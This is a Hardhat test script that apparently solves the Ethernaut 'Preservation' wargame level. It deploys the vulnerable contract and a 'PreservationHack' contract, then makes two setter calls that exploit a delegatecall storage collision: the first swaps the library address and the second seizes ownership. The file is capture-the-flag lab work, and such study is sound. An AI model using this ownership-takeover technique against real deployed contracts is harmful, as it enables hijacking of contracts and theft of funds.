const { expect } = require("chai");
const { ethers } = require("hardhat");
const {BigNumber} = require("ethers");

describe("Preservation", function () {
  it("Preservation", async function () {
    const [user] = await ethers.getSigners();
    const TimeZone1Library = await ethers.getContractFactory("LibraryContract");
    const lib1 = await TimeZone1Library.deploy();
    await lib1.deployed();

    const TimeZone2Library = await ethers.getContractFactory("LibraryContract");
    const lib2 = await TimeZone2Library.deploy();
    await lib2.deployed();

    const Preservation = await ethers.getContractFactory("Preservation");
    const preservation = await Preservation.deploy(lib1.address, lib2.address);
    await preservation.deployed();

    console.log(`owner: ${await preservation.owner()}`);
    console.log(`timeZone1Library: ${await preservation.timeZone1Library()}`);

    const PreservationHack = await ethers.getContractFactory("PreservationHack");
    const preservation_hack = await PreservationHack.deploy();
    await preservation_hack.deployed();
    console.log(`preservation_hack addr: ${preservation_hack.address}`);

    let tx = await preservation.setSecondTime(BigNumber.from(preservation_hack.address));
    await tx.wait();
    console.log(`owner: ${await preservation.owner()}`);
    console.log(`timeZone1Library: ${await preservation.timeZone1Library()}`);

    tx = await preservation.setFirstTime(BigNumber.from(user.address));
    await tx.wait();
    console.log(`user: ${ user.address }`);
    console.log(`owner: ${await preservation.owner()}`);
    expect(await preservation.owner()).to.equal(user.address);
  });
});
